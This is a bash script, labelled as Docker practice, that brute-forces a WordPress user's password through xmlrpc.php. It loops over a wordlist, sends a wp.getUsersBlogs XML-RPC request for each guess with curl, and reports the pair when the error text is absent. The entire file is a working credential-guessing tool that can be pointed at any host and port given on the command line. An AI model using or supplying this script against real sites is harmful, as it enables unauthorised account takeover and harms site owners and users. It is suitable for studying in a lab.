#!/usr/bin/env bash

greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

function ctrl_c(){
  echo -e "${redColour}[!] Exiting...${endColour}"
  tput cnorm; exit 1
}

trap ctrl_c SIGINT

function help_panel(){
  echo -e "\n\t${turquoiseColour}---------- WordPress xmlrpc.php enumeration (Docker practice) ----------${endColour}"
  echo -e "\n\t\t${greenColour}[+]${endColour} ${yellowColour}-t${endColour} ${blueColour}Write the ip (EX: $0 -t 127.0.0.1)${endColour}"
  echo -e "\t\t${greenColour}[+]${endColour} ${yellowColour}-u${endColour} ${blueColour}Write the knowledge user${endColour}"
  echo -e "\t\t${greenColour}[+]${endColour} ${yellowColour}-p${endColour} ${blueColour}Write the port of the cmb service(EX: $0 -p 31337)${endColour}"
  echo -e "\t\t${greenColour}[+]${endColour} ${yellowColour}-w${endColour} ${blueColour}The wordlist that the program will use${endColour}"
  echo -e "\t\t${greenColour}[+]${endColour} ${yellowColour}-h${endColour} ${blueColour}Prints the help panel${endColour}"
}

function abussing(){
  local ull=$1
  local pass=$2
  local usr=$3
  xml_file="""
  <?xml version=\"1.0\" encoding=\"UTF-8\"?>
  <methodCall> 
  <methodName>wp.getUsersBlogs</methodName> 
  <params> 
  <param><value>$usr</value></param> 
  <param><value>$pass</value></param> 
  </params> 
  </methodCall>
  """

  echo $xml_file > file.xml
  request=$(curl -s -X POST "$ull" -d@file.xml)
  if [[ ! "$(echo $request | grep 'Incorrect username or password.')" ]]; then
    echo -e "\n\t\t${blueColour}---------- Results ----------${endColour}"
    echo -e "\n\t\t${greenColour}[+] The USER ${endColour}${yellowColour}$usr${greenColour} - ${endColour}${greenColour}PASSWORD: ${endColour}${turquoiseColour}$pass${endColour}"
    exit 0
  fi
}

function search_users(){
  echo -e "\n\t${turquoiseColour}---------- WordPress xmlrpc.php enumeration (Docker practice) ----------${endColour}"
  local trgt=$1
  local usr=$2
  local prt=$3
  local word=$4
  url="http://$1:$3/xmlrpc.php"

  echo -e "\n\t\t${greenColour}---------- Data ----------${endColour}"
  echo -e "\n\t\t\t${greenColour}[+] Url:${endColour} ${yellowColour}$url${endColour}"
  echo -e "\t\t\t${greenColour}[+] Abussing:${endColour} ${yellowColour}File xmlrpc.php${endColour}"
  echo -e "\t\t\t${greenColour}[+] User:${endColour} ${yellowColour}$usr${endColour}"
  echo -e "\t\t\t${greenColour}[+] Port:${endColour} ${yellowColour}$prt${endColour}"
  echo -e "\t\t\t${greenColour}[+] WordList:${endColour} ${yellowColour}$word${endColour}"

  if [ -f "$4" ]; then
    tput civis
    cat $4 | while read pasword; do
      abussing $url $pasword $usr
    done
    tput cnorm
  else
    echo -e "${redColour}[!] The WordList $4 does not exists${endColour}"
    exit 1
  fi
}

declare -i counter=0
while getopts "t:u:p:w:h" arg; do
  case $arg in
    t) target=$OPTARG; let counter+=2;;
    u) user=$OPTARG; let counter+=2;;
    p) port=$OPTARG; let counter+=2;;
    w) word_list=$OPTARG; let counter+=2;;
    h);;
  esac
done

if [[ $counter -eq 8 ]]; then

  search_users $target $user $port $word_list

else
  help_panel
fi

